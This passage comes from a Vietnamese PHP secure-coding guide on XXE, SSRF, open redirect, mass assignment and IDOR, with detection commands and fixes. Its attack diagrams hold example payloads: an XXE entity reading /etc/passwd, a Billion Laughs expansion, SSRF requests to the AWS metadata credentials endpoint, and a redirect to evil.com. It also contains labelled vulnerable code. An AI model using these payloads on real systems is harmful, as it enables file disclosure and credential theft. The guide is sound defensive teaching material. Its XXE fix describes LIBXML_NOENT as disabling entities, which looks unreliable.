- [ ] Thiết lập `open_basedir` trong php.ini

**OWASP References:**
- OWASP Top 10: A01:2021 – Broken Access Control
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- https://owasp.org/www-community/attacks/Path_Traversal

---

## 13. XML External Entity (XXE) - CRITICAL

### 1. Tên
**XML External Entity Injection** (Chèn Thực Thể XML Bên Ngoài)

### 2. Phân loại
Bảo Mật Web / Input Validation / Information Disclosure / SSRF

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Kẻ tấn công đọc file tùy ý trên server, thực hiện SSRF, hoặc gây Denial of Service (Billion Laughs attack).

### 4. Vấn đề
XXE xảy ra khi XML parser xử lý external entity references trong XML input. Bằng cách định nghĩa external entity trỏ đến file local hoặc URL, kẻ tấn công có thể đọc nội dung file hoặc thực hiện request từ server.

```
LUỒNG TẤN CÔNG XXE
===================

Kẻ tấn công                        Ứng dụng PHP              File/Network
     │                                   │                          │
     │  POST /api/import                  │                          │
     │  Content-Type: application/xml     │                          │
     │                                   │                          │
     │  <?xml version="1.0"?>            │                          │
     │  <!DOCTYPE foo [                  │                          │
     │    <!ENTITY xxe SYSTEM            │                          │
     │    "file:///etc/passwd">          │                          │
     │  ]>                               │                          │
     │  <data>&xxe;</data>               │                          │
     │──────────────────────────────────>│                          │
     │                                   │  simplexml_load_string() │
     │                                   │  Không disable entities  │
     │                                   │──────────────────────────>│
     │                                   │                           │ Đọc /etc/passwd
     │  root:x:0:0:root:/root:/bin/bash  │                           │
     │<──────────────────────────────────│                           │
     │                                   │                           │
     │  SSRF via XXE:                    │                           │
     │  <!ENTITY xxe SYSTEM             │                           │
     │  "http://internal-api:8080/admin">│                           │
     │  -> Server thực hiện request đến internal API!
     │                                   │                           │
     │  Billion Laughs DoS:              │                           │
     │  <!ENTITY a "lol">               │                           │
     │  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;">
     │  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;">
     │  ... -> Exponential expansion -> OOM
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm simplexml_load_string/file không disable entities
rg --type php "simplexml_load_(string|file)\s*\(" -n -B2 -A5

# Tìm DOMDocument parse XML
rg --type php "DOMDocument\s*\(\s*\)" -n -A10

# Tìm libxml_disable_entity_loader (nên gọi trước parse)
rg --type php "libxml_disable_entity_loader" -n

# Tìm XMLReader
rg --type php "XMLReader::" -n -A10

# Tìm SimpleXMLElement
rg --type php "new\s+SimpleXMLElement\s*\(" -n -B2 -A5
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - XXE
// ============================================================
$xml = $_POST['xml_data'];
$doc = simplexml_load_string($xml); // NGUY HIỂM!

// DOMDocument cũng nguy hiểm mặc định
$dom = new DOMDocument();
$dom->loadXML($xml); // XXE enabled by default!

// ============================================================
// SECURE - Disable external entities
// ============================================================

// PHP thuần - DOMDocument an toàn
function parseXmlSafe(string $xml): DOMDocument
{
    // Bước 1: Disable external entities TRƯỚC KHI parse
    // PHP 8.0+: libxml_disable_entity_loader() deprecated, dùng LIBXML_NOENT flag
    $previousSetting = libxml_disable_entity_loader(true); // PHP < 8.0

    $dom = new DOMDocument();

    // Dùng flags để disable external entities (PHP 8.0+)
    $dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);

    libxml_disable_entity_loader($previousSetting); // Restore

    return $dom;
}

// SimpleXML an toàn (PHP 8.0+)
function parseSimpleXmlSafe(string $xml): \SimpleXMLElement|false
{
    // LIBXML_NONET: Disable network access
    // LIBXML_NOENT: Disable entity substitution
    return simplexml_load_string(
        $xml,
        'SimpleXMLElement',
        LIBXML_NONET | LIBXML_NOENT
    );
}

// PHP 8.0+ approach - libxml_set_external_entity_loader
libxml_set_external_entity_loader(function () {
    // Return null hoặc throw exception để block tất cả external entities
    return null;
});

// Sử dụng schema validation để từ chối XML không hợp lệ
function parseAndValidateXml(string $xml, string $schemaPath): DOMDocument
{
    $dom = new DOMDocument();
    $dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);

    // Validate với XSD schema
    if (!$dom->schemaValidate($schemaPath)) {
        throw new \InvalidArgumentException('XML không hợp lệ theo schema');
    }

    return $dom;
}

// Laravel - nếu cần parse XML từ request
class XmlImportController extends Controller
{
    public function import(Request $request): JsonResponse
    {
        $xmlContent = $request->getContent();

        // Validate content type
        if ($request->header('Content-Type') !== 'application/xml') {
            return response()->json(['error' => 'Content-Type phải là application/xml'], 400);
        }

        // Giới hạn kích thước
        if (strlen($xmlContent) > 1024 * 1024) { // 1MB
            return response()->json(['error' => 'XML quá lớn'], 413);
        }

        // Parse an toàn
        $dom = new \DOMDocument();
        $loaded = $dom->loadXML($xmlContent, LIBXML_NONET | LIBXML_NOENT);

        if (!$loaded) {
            return response()->json(['error' => 'XML không hợp lệ'], 400);
        }

        // Xử lý dữ liệu...
        return response()->json(['success' => true]);
    }
}

// Symfony - XMLParser với security options
use Symfony\Component\Serializer\Encoder\XmlEncoder;

// XmlEncoder của Symfony tự động disable external entities
$encoder = new XmlEncoder();
$data = $encoder->decode($xmlContent, 'xml');
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Luôn dùng `LIBXML_NONET | LIBXML_NOENT` flags khi parse XML
- [ ] PHP 8.0+: Dùng `libxml_set_external_entity_loader()` trả về null
- [ ] PHP < 8.0: Gọi `libxml_disable_entity_loader(true)` trước khi parse
- [ ] Validate XML với XSD schema whitelist
- [ ] Giới hạn kích thước XML input
- [ ] Cân nhắc dùng JSON thay XML nếu không cần thiết
- [ ] Dùng Symfony XmlEncoder thay vì parse thủ công

**PHPStan / Psalm rules:**
```bash
# Psalm plugin detect XXE
composer require --dev psalm/plugin-security-analysis
```

**OWASP References:**
- OWASP Top 10: A05:2021 – Security Misconfiguration
- CWE-611: Improper Restriction of XML External Entity Reference
- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

---

## 14. SSRF - HIGH

### 1. Tên
**Server-Side Request Forgery** (Giả Mạo Yêu Cầu Phía Server)

### 2. Phân loại
Bảo Mật Web / Network Security / Information Disclosure

### 3. Mức nghiêm trọng
🟠 **HIGH** - Kẻ tấn công buộc server thực hiện HTTP request đến địa chỉ tùy ý, có thể truy cập nội bộ mạng (metadata service AWS, Kubernetes API, internal services), hoặc scan mạng nội bộ.

### 4. Vấn đề
SSRF xảy ra khi ứng dụng fetch URL do người dùng cung cấp mà không validate. Kẻ tấn công trỏ URL đến địa chỉ nội bộ (127.0.0.1, 169.254.169.254, 10.x.x.x) để bypass firewall và truy cập service chỉ có thể dùng nội bộ.

```
LUỒNG TẤN CÔNG SSRF
=====================

Kẻ tấn công                          Ứng dụng PHP           Internal Network
     │                                     │                        │
     │  POST /fetch-url                     │                        │
     │  url=http://169.254.169.254/         │                        │
     │     latest/meta-data/iam/            │                        │
     │     security-credentials/           │                        │
     │────────────────────────────────────>│                        │
     │                                     │  curl($url) hoặc       │
     │                                     │  file_get_contents($url)│
     │                                     │────────────────────────>│
     │                                     │                         │ AWS Metadata
     │                                     │                         │ Service trả về
     │                                     │                         │ IAM credentials!
     │  AccessKeyId: ASIA...              │                         │
     │  SecretAccessKey: xxx...           │                         │
     │<────────────────────────────────────│                         │
     │                                     │                         │
     │  Tấn công nội bộ:                  │                         │
     │  url=http://internal-db:5432        │ Port scan               │
     │  url=http://k8s-api:6443/api/v1    │ Kubernetes API          │
     │  url=http://localhost/admin         │ Local admin panel       │
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm curl với URL từ user
rg --type php "curl_setopt.*CURLOPT_URL.*\\\$_(GET|POST|REQUEST)" -n
rg --type php "curl_init\s*\(\s*\\\$_(GET|POST|REQUEST)" -n

# Tìm file_get_contents với URL từ user
rg --type php "file_get_contents\s*\(\s*\\\$_(GET|POST|REQUEST)" -n

# Tìm Http::get/post với user input (Laravel HTTP Client)
rg --type php "Http::(get|post)\s*\(\s*\\\$_(GET|POST|REQUEST)" -n
rg --type php "Http::(get|post)\s*\(\s*\\\$(url|webhook|endpoint|target)" -n

# Tìm Guzzle với user URL
rg --type php "\\\$client->(get|post|request)\s*\(\s*\\\$(url|webhook|endpoint)" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - SSRF
// ============================================================
$url = $_POST['webhook_url'];
$response = file_get_contents($url); // SSRF!

// Guzzle SSRF
$client = new \GuzzleHttp\Client();
$response = $client->get($_GET['url']); // SSRF!

// Laravel HTTP client SSRF
$response = Http::get($request->input('url')); // SSRF!

// ============================================================
// SECURE - URL Validation và Allowlist
// ============================================================

class SafeHttpClient
{
    // Dãy IP nội bộ cần block
    private const BLOCKED_IP_RANGES = [
        '10.0.0.0/8',
        '172.16.0.0/12',
        '192.168.0.0/16',
        '127.0.0.0/8',
        '169.254.0.0/16',  // AWS/GCP metadata
        '::1',              // IPv6 localhost
        'fc00::/7',         // IPv6 private
    ];

    // Chỉ cho phép schemes này
    private const ALLOWED_SCHEMES = ['https'];

    // Allowlist domain (nếu có thể áp dụng)
    private const ALLOWED_DOMAINS = [
        'api.trusted-partner.com',
        'webhook.example.com',
    ];

    public function fetch(string $url): string
    {
        // 1. Parse URL
        $parsed = parse_url($url);
        if (!$parsed || !isset($parsed['scheme'], $parsed['host'])) {
            throw new \InvalidArgumentException('URL không hợp lệ');
        }

        // 2. Chỉ cho phép HTTPS
        if (!in_array(strtolower($parsed['scheme']), self::ALLOWED_SCHEMES, true)) {
            throw new \InvalidArgumentException('Chỉ hỗ trợ HTTPS');
        }

        // 3. Resolve hostname thành IP
        $host = $parsed['host'];
        $ip = gethostbyname($host);
        if ($ip === $host) {
            throw new \InvalidArgumentException('Không thể resolve hostname');
        }

        // 4. Kiểm tra IP không phải private/loopback
        if ($this->isPrivateIp($ip)) {
            throw new \InvalidArgumentException('Địa chỉ IP không được phép');
        }

        // 5. (Tùy chọn) Whitelist domain
        if (!in_array($host, self::ALLOWED_DOMAINS, true)) {
            throw new \InvalidArgumentException('Domain không được phép');
        }

        // 6. Thực hiện request với timeout nghiêm ngặt
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_MAXREDIRS      => 0,      // Không follow redirects (bypass SSRF!)
            CURLOPT_FOLLOWLOCATION => false,  // Không follow redirects
            CURLOPT_SSL_VERIFYPEER => true,   // Verify SSL cert
            CURLOPT_SSL_VERIFYHOST => 2,
            // Bind ra IP cụ thể nếu cần (outbound IP)
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode < 200 || $httpCode >= 300) {
            throw new \RuntimeException("HTTP error: $httpCode");
        }

        return $response ?: '';
    }

    private function isPrivateIp(string $ip): bool
    {
        // Dùng filter_var để check private/reserved
        return !filter_var(
            $ip,
            FILTER_VALIDATE_IP,
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
        );
    }
}

// Laravel - webhook handler an toàn
class WebhookController extends Controller
{
    public function store(Request $request, SafeHttpClient $httpClient): JsonResponse
    {
        $request->validate([
            'webhook_url' => ['required', 'url', 'max:500'],
        ]);

        $url = $request->input('webhook_url');

        try {
            $response = $httpClient->fetch($url);
            // Xử lý response...
            return response()->json(['success' => true]);
        } catch (\InvalidArgumentException $e) {
            return response()->json(['error' => $e->getMessage()], 400);
        }
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Validate URL: chỉ cho phép scheme HTTPS
- [ ] Resolve DNS và kiểm tra IP không phải private/loopback/metadata
- [ ] Không follow HTTP redirects (kẻ tấn công có thể redirect đến private IP)
- [ ] Dùng allowlist domain nếu có thể
- [ ] Set timeout ngắn cho HTTP request
- [ ] Chạy HTTP request từ isolated network segment (không có access vào internal)
- [ ] Dùng Egress firewall để block outbound đến private IP ranges

**OWASP References:**
- OWASP Top 10: A10:2021 – Server-Side Request Forgery (SSRF)
- CWE-918: Server-Side Request Forgery
- https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/

---

## 15. Open Redirect - MEDIUM

### 1. Tên
**Open Redirect** (Chuyển Hướng Mở)

### 2. Phân loại
Bảo Mật Web / Input Validation / Phishing

### 3. Mức nghiêm trọng
🟡 **MEDIUM** - Kẻ tấn công dùng domain tin cậy để phân phối link phishing, bypass email filter, dẫn người dùng đến trang giả mạo để đánh cắp thông tin đăng nhập.

### 4. Vấn đề
Open Redirect xảy ra khi ứng dụng chuyển hướng người dùng đến URL được cung cấp trong request parameter mà không validate. Kẻ tấn công tạo link có vẻ hợp lệ (domain thật) nhưng redirect đến trang độc hại.

```
LUỒNG TẤN CÔNG OPEN REDIRECT
===============================

Kẻ tấn công                          Nạn nhân                  Ứng dụng
     │                                    │                          │
     │  Tạo URL phishing:                 │                          │
     │  https://trusted.com/redirect?     │                          │
     │  url=https://evil.com/fake-login   │                          │
     │                                    │                          │
     │  Gửi qua email/chat ──────────────>│                          │
     │                                    │  Click link              │
     │                                    │──────────────────────────>│
     │                                    │                           │ redirect($_GET['url'])
     │                                    │                           │ Không validate!
     │                                    │  HTTP 302 -> evil.com     │
     │                                    │<──────────────────────────│
     │                                    │  Truy cập fake login page │
     │                                    │──────────────────────────>│ evil.com
     │                                    │  Nhập credentials        │
     │  Nhận stolen credentials          │                           │
     │<───────────────────────────────────│                           │
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm redirect với URL từ user
rg --type php "(header\s*\(\s*['\"]Location:.*\\\$)" -n
rg --type php "redirect\s*\(\s*\\\$_(GET|POST|REQUEST)" -n

# Tìm return redirect() với input không validate
rg --type php "return\s+redirect\s*\(\s*\\\$request->(input|get)\s*\(\s*['\"]" -n

# Tìm header Location với redirect param
rg --type php "header.*Location.*redirect\|return_url\|next\|url\|goto" -i -n

# Tìm wp_redirect, Redirect::to với user input (nếu dùng WordPress)
rg --type php "wp_redirect\s*\(\s*\\\$_(GET|POST)" -n
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - Open Redirect
// ============================================================
$url = $_GET['redirect'];
header("Location: $url"); // Redirect đến bất kỳ URL nào!
exit;

// Laravel
return redirect($request->input('return_url')); // NGUY HIỂM!

// ============================================================
// SECURE
// ============================================================

// Cách 1: Chỉ redirect đến internal paths (không accept full URL)
function safeRedirect(string $path): void
{
    // Chỉ cho phép path bắt đầu bằng /
    if (!preg_match('/^\/[a-zA-Z0-9\-_\/\?\&\=\#\.]*$/', $path)) {
        $path = '/'; // Default về homepage
    }

    // Đảm bảo không có protocol (ngăn //evil.com trick)
    if (preg_match('/^\/\//', $path)) {
        $path = '/';
    }

    header('Location: ' . $path);
    exit;
}

// Cách 2: Whitelist các URL được phép
class SafeRedirectManager
{
    private const ALLOWED_HOSTS = [
        'app.example.com',
        'admin.example.com',
        'api.example.com',
    ];

    public function redirect(string $url, string $default = '/'): void
    {
        $parsed = parse_url($url);

        // Nếu là relative path - an toàn
        if (!isset($parsed['host'])) {
            $safePath = $this->sanitizePath($url);
            header('Location: ' . $safePath);
            exit;
        }

        // Nếu có host - kiểm tra whitelist
        if (in_array($parsed['host'], self::ALLOWED_HOSTS, true)) {
            // Verify scheme là https
            if (isset($parsed['scheme']) && $parsed['scheme'] !== 'https') {
                header('Location: ' . $default);
                exit;
            }
            header('Location: ' . $url);
            exit;
        }

        // Host không trong whitelist - redirect về default
        header('Location: ' . $default);
        exit;
    }

    private function sanitizePath(string $path): string
    {
        // Normalize và validate path
        $path = '/' . ltrim($path, '/');
        // Remove any protocol-relative URLs
        if (preg_match('/^\/\//', $path)) {
            return '/';
        }
        return $path;
    }
}

// Cách 3: Dùng token-based redirect (URL không expose trực tiếp)
class TokenRedirectController extends Controller
{
    // Lưu mapping token -> URL trong cache/DB
    public function store(Request $request): JsonResponse
    {
        $url = $request->input('url');

        // Validate URL nội bộ
        if (!$this->isInternalUrl($url)) {
            return response()->json(['error' => 'URL không hợp lệ'], 400);
        }

        $token = \Str::random(32);
        cache()->put('redirect:' . $token, $url, now()->addMinutes(5));

        return response()->json(['token' => $token]);
    }

    public function follow(string $token): RedirectResponse
    {
        $url = cache()->pull('redirect:' . $token);

        if (!$url) {
            abort(404);
        }

        return redirect($url);
    }

    private function isInternalUrl(string $url): bool
    {
        $appHost = parse_url(config('app.url'), PHP_URL_HOST);
        $urlHost = parse_url($url, PHP_URL_HOST);
        return $urlHost === null || $urlHost === $appHost;
    }
}

// Laravel - intended() redirect (built-in, an toàn)
// Chỉ redirect đến intended URL trong cùng app
return redirect()->intended('/dashboard');

// Laravel - kiểm tra URL nội bộ
use Illuminate\Support\Facades\URL;

$returnUrl = $request->input('return_url', '/dashboard');
// Chỉ redirect đến URL cùng domain
if (!str_starts_with($returnUrl, '/') && !URL::isValidUrl($returnUrl)) {
    $returnUrl = '/dashboard';
}
return redirect($returnUrl);
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Không redirect đến URL từ request parameters nếu có thể tránh
- [ ] Nếu phải redirect: chỉ cho phép relative paths (bắt đầu bằng `/`)
- [ ] Dùng whitelist host nếu cần redirect đến domain khác
- [ ] Cảnh báo người dùng khi redirect ra ngoài app (interstitial page)
- [ ] Dùng `redirect()->intended()` của Laravel (có giới hạn nội bộ)
- [ ] Log tất cả redirect đến external domain
- [ ] Dùng token-based redirect thay vì expose URL trực tiếp

**OWASP References:**
- CWE-601: URL Redirection to Untrusted Site (Open Redirect)
- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-Side_Testing/04-Testing_for_Client_Side_URL_Redirect

---

## 16. Mass Assignment - HIGH

### 1. Tên
**Mass Assignment** (Gán Hàng Loạt Không Kiểm Soát)

### 2. Phân loại
Bảo Mật Web / Input Validation / Broken Access Control

### 3. Mức nghiêm trọng
🟠 **HIGH** - Kẻ tấn công thêm fields không được phép vào request để gán giá trị cho các thuộc tính nhạy cảm như `is_admin`, `role`, `balance`, `email_verified_at`.

### 4. Vấn đề
Mass Assignment xảy ra khi ứng dụng tự động gán tất cả fields từ request vào model mà không lọc các field được phép. Đây là lỗi cổ điển với Eloquent ORM khi dùng `$model->fill()` hoặc `User::create()` với `$request->all()`.

```
LUỒNG TẤN CÔNG MASS ASSIGNMENT
=================================

Kẻ tấn công                          Ứng dụng PHP (Laravel)      Database
     │                                      │                          │
     │  POST /profile/update                │                          │
     │  {                                   │                          │
     │    "name": "John",                   │                          │
     │    "email": "john@ex.com",           │                          │
     │    "is_admin": true,         <-- Thêm field ẩn!
     │    "role": "admin",          <-- Thêm field ẩn!
     │    "balance": 999999         <-- Thêm field ẩn!
     │  }                                   │                          │
     │─────────────────────────────────────>│                          │
     │                                      │  User::create(           │
     │                                      │    $request->all()       │
     │                                      │  );                      │
     │                                      │  // Gán TẤT CẢ fields!   │
     │                                      │──────────────────────────>│
     │                                      │                           │ UPDATE users SET
     │                                      │                           │ is_admin=1,
     │                                      │                           │ role='admin',
     │                                      │                           │ balance=999999
     │  Tài khoản trở thành admin!         │                           │
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm User::create/$model->fill với $request->all()
rg --type php "(create|fill|update)\s*\(\s*\\\$request->all\s*\(\s*\)" -n

# Tìm thiếu $fillable hoặc $guarded trong Model
rg --type php "class.*extends\s+Model" -n -A20 | grep -v "fillable\|guarded"

# Tìm fill/create với toArray() hoặc request input không filter
rg --type php "(create|fill)\s*\(\s*\\\$request->(toArray|input)\b" -n

# Tìm update với all()
rg --type php "->update\s*\(\s*\\\$request->all\s*\(\s*\)" -n

# Tìm Model không có $guarded = [] protection
rg --type php "protected\s+\\\$guarded\s*=\s*\[\s*\]" -n  # Nguy hiểm: guarded rỗng
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - Mass Assignment
// ============================================================

// Model không có $fillable
class User extends Model
{
    // Không khai báo $fillable -> tất cả fields đều fillable!
    // Hoặc tệ hơn:
    protected $guarded = []; // Không guard gì cả!
}

// Controller không filter input
class UserController extends Controller
{
    public function store(Request $request): JsonResponse
    {
        $user = User::create($request->all()); // NGUY HIỂM!
        return response()->json($user);
    }

    public function update(Request $request, User $user): JsonResponse
    {
        $user->fill($request->all()); // NGUY HIỂM!
        $user->save();
        return response()->json($user);
    }
}

// ============================================================
// SECURE - Whitelist fields
// ============================================================

// Model với $fillable whitelist (LUÔN DÙNG CÁCH NÀY)
class User extends Model
{
    // Chỉ những field này mới được fill từ bên ngoài
    protected $fillable = [
        'name',
        'email',
        'phone',
        'bio',
    ];

    // Các field nhạy cảm - không bao giờ mass assignable
    // is_admin, role, balance, email_verified_at, password (qua reset flow riêng)
}

// Controller an toàn - validate và chỉ lấy fields cần thiết
class UserController extends Controller
{
    public function store(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'name'  => ['required', 'string', 'max:255'],
            'email' => ['required', 'email', 'unique:users'],
            'phone' => ['nullable', 'string', 'max:20'],
            'bio'   => ['nullable', 'string', 'max:1000'],
        ]);

        // Chỉ validated fields được truyền vào create()
        $user = User::create($validated);

        return response()->json($user, 201);
    }

    public function update(Request $request, User $user): JsonResponse
    {
        $this->authorize('update', $user);

        $validated = $request->validate([
            'name'  => ['sometimes', 'string', 'max:255'],
            'email' => ['sometimes', 'email', 'unique:users,email,' . $user->id],
            'bio'   => ['nullable', 'string', 'max:1000'],
        ]);

        $user->update($validated);

        return response()->json($user);
    }

    // Admin-only update - xử lý riêng biệt
    public function adminUpdate(Request $request, User $user): JsonResponse
    {
        $this->authorize('admin-update', $user);

        $validated = $request->validate([
            'role'     => ['required', Rule::in(['user', 'moderator', 'admin'])],
            'is_admin' => ['required', 'boolean'],
        ]);

        // Set field nhạy cảm chỉ qua admin route, không qua fill()
        $user->role     = $validated['role'];
        $user->is_admin = $validated['is_admin'];
        $user->save();

        return response()->json($user);
    }
}

// Symfony Form - tự động whitelist fields
use Symfony\Component\Form\AbstractType;
use Symfony\Component\Form\FormBuilderInterface;
use Symfony\Component\OptionsResolver\OptionsResolver;

class UserType extends AbstractType
{
    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        $builder
            ->add('name')
            ->add('email')
            ->add('bio');
        // Không add 'is_admin', 'role' -> không thể set qua form
    }

    public function configureOptions(OptionsResolver $resolver): void
    {
        $resolver->setDefaults(['data_class' => User::class]);
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Luôn khai báo `$fillable` trong mọi Eloquent Model
- [ ] Không dùng `$guarded = []` trừ trường hợp đặc biệt
- [ ] Không truyền `$request->all()` trực tiếp vào `create()` hoặc `fill()`
- [ ] Validate input với `$request->validate()` trước khi tạo model
- [ ] Xử lý riêng biệt các fields nhạy cảm (`role`, `is_admin`, `balance`)
- [ ] Dùng Laravel Form Request để centralize validation
- [ ] Code review: grep tất cả `$request->all()` trong codebase

**PHPStan rule:**
```bash
# Cài phpstan-larastan để detect mass assignment issues
composer require --dev nunomaduro/larastan
```

**OWASP References:**
- OWASP Top 10: A01:2021 – Broken Access Control
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- https://laravel.com/docs/eloquent#mass-assignment

---

## 17. Insecure Direct Object Reference (IDOR) - HIGH

### 1. Tên
**Insecure Direct Object Reference** (Tham Chiếu Đối Tượng Trực Tiếp Không An Toàn)

### 2. Phân loại
Bảo Mật Web / Access Control / Authorization

### 3. Mức nghiêm trọng
🟠 **HIGH** - Kẻ tấn công thay đổi ID trong request để truy cập hoặc chỉnh sửa dữ liệu của người dùng khác mà không được phép.

### 4. Vấn đề
IDOR xảy ra khi ứng dụng dùng ID có thể đoán được (sequential integer) để tham chiếu đến object, nhưng không kiểm tra người dùng hiện tại có quyền truy cập object đó không. Đây là lỗi phổ biến nhất trong các bug bounty program.

```
LUỒNG TẤN CÔNG IDOR
=====================

Người dùng hợp lệ (User A)           Ứng dụng PHP              Database
     │                                      │                         │
     │  GET /orders/12345                   │                         │
     │─────────────────────────────────────>│                         │
     │  Nhận đơn hàng #12345 của mình      │                         │
     │<─────────────────────────────────────│                         │
     │                                      │                         │
     │  GET /orders/12346  <-- Thay ID!     │                         │
     │─────────────────────────────────────>│                         │
     │                                      │  SELECT * FROM orders   │
     │                                      │  WHERE id = 12346       │
     │                                      │  // Không check owner!  │
     │                                      │─────────────────────────>│
     │  Nhận đơn hàng #12346 của User B!   │                         │
     │<─────────────────────────────────────│                         │
     │                                      │                         │
     │  DELETE /orders/12347                │                         │
     │─────────────────────────────────────>│                         │
     │  Xóa đơn hàng của User C!            │                         │
```

### 5. Phát hiện trong mã nguồn

```bash
# Tìm findOrFail/find không check ownership
rg --type php "findOrFail\s*\(\s*\\\$" -n -A5

# Tìm DB query với ID từ route không check user
rg --type php "->where\s*\(\s*['\"]id['\"].*\\\$" -n -B3 -A3

# Tìm Model::find với route parameter, thiếu where user_id
rg --type php "(Order|User|Invoice|Document)::(find|findOrFail)\s*\(\s*\\\$" -n

# Tìm DELETE/UPDATE không check ownership
rg --type php "(->delete\s*\(\s*\)|->update\s*\()" -n -B5

# Tìm thiếu authorize() hoặc Policy check
rg --type php "public function (show|update|destroy|edit)" -n -A10
```

### 6. Giải pháp

```php
<?php
// ============================================================
// VULNERABLE - IDOR
// ============================================================

class OrderController extends Controller
{
    // Không check ownership - bất kỳ user đã đăng nhập nào cũng xem được
    public function show(int $id): JsonResponse
    {
        $order = Order::findOrFail($id); // IDOR!
        return response()->json($order);
    }

    public function destroy(int $id): JsonResponse
    {
        $order = Order::findOrFail($id);
        $order->delete(); // Bất kỳ user nào cũng xóa được!
        return response()->json(['success' => true]);
    }
}

// ============================================================
// SECURE - Authorization check
// ============================================================

class OrderController extends Controller
{
    // Cách 1: Thêm where user_id vào query
    public function show(int $id): JsonResponse
    {
        $order = Order::where('id', $id)
            ->where('user_id', auth()->id()) // Chỉ lấy order của mình
            ->firstOrFail();

        return response()->json($order);
    }

    // Cách 2: Dùng Laravel Policy (RECOMMENDED)
    public function showWithPolicy(Order $order): JsonResponse
    {
        // Route model binding tự load order
        // Policy check: chỉ owner hoặc admin mới xem được
        $this->authorize('view', $order);

        return response()->json($order);
    }

    public function destroy(Order $order): JsonResponse
    {
        $this->authorize('delete', $order);
        $order->delete();
        return response()->json(['success' => true]);
    }

    // Cách 3: Dùng relationship scope
    public function index(): JsonResponse
    {
        // Chỉ lấy orders của user hiện tại
        $orders = auth()->user()->orders()->paginate(20);
        return response()->json($orders);
    }
}

// Policy definition
// app/Policies/OrderPolicy.php
class OrderPolicy
{
    public function view(User $user, Order $order): bool
    {
        // Owner hoặc admin được xem
        return $user->id === $order->user_id || $user->isAdmin();
    }

    public function update(User $user, Order $order): bool
    {
        // Chỉ owner mới được update
        return $user->id === $order->user_id;
    }

    public function delete(User $user, Order $order): bool
    {
        // Owner hoặc admin được xóa
        return $user->id === $order->user_id || $user->isAdmin();
    }
}

// Dùng UUID thay vì sequential integer (obscurity, không phải security)
// Kết hợp với authorization check
use Illuminate\Database\Eloquent\Concerns\HasUuids;

class Document extends Model
{
    use HasUuids; // UUID primary key - khó đoán hơn

    protected $fillable = ['title', 'content', 'user_id'];
}

// Scope để luôn filter theo user
class Order extends Model
{
    // Global scope - tự động filter theo user hiện tại
    protected static function booted(): void
    {
        static::addGlobalScope('owned', function ($query) {
            if (auth()->check()) {
                $query->where('user_id', auth()->id());
            }
        });
    }
}

// Symfony - Voter pattern
use Symfony\Component\Security\Core\Authorization\Voter\Voter;

class OrderVoter extends Voter
{
    protected function supports(string $attribute, mixed $subject): bool
    {
        return in_array($attribute, ['VIEW', 'EDIT', 'DELETE'])
            && $subject instanceof Order;
    }

    protected function voteOnAttribute(string $attribute, mixed $subject, TokenInterface $token): bool
    {
        $user = $token->getUser();
        if (!$user instanceof User) {
            return false;
        }

        return match($attribute) {
            'VIEW'   => $subject->getUser() === $user || in_array('ROLE_ADMIN', $user->getRoles()),
            'EDIT'   => $subject->getUser() === $user,
            'DELETE' => $subject->getUser() === $user || in_array('ROLE_ADMIN', $user->getRoles()),
            default  => false,
        };
    }
}
```

### 7. Phòng ngừa

**Checklist:**
- [ ] Luôn kiểm tra ownership khi truy cập/sửa/xóa resource
- [ ] Dùng Laravel Policies để centralize authorization logic
- [ ] Dùng Route Model Binding với Policies
- [ ] Filter query theo `user_id` của user hiện tại
- [ ] Cân nhắc dùng UUID thay sequential ID (giảm đoán ID, không phải giải pháp bảo mật)
- [ ] Dùng Global Scopes trong Eloquent để auto-filter
- [ ] Test: thử truy cập resource của user khác trong integration tests
- [ ] Log các trường hợp truy cập bị từ chối (detect probing)

**OWASP References:**
- OWASP Top 10: A01:2021 – Broken Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References

---

## 18. Header Injection - HIGH

### 1. Tên
**HTTP Header Injection / Response Splitting** (Chèn HTTP Header / Tách Phản Hồi)

### 2. Phân loại
Bảo Mật Web / Input Validation / Response Manipulation

### 3. Mức nghiêm trọng
🟠 **HIGH** - Kẻ tấn công chèn HTTP headers tùy ý, thực hiện Response Splitting (tạo response giả), set cookie độc hại, redirect đến URL khác, hoặc kết hợp với cache poisoning.

### 4. Vấn đề
Header Injection xảy ra khi ứng dụng đưa input người dùng vào HTTP response header mà không loại bỏ ký tự newline (`\r\n`, `\n`). Kẻ tấn công chèn `\r\n` để tạo header mới hoặc tách response thành 2 responses riêng biệt.

```
LUỒNG TẤN CÔNG HEADER INJECTION
==================================

Kẻ tấn công                             Ứng dụng PHP             Nạn nhân/Cache
     │                                        │                         │
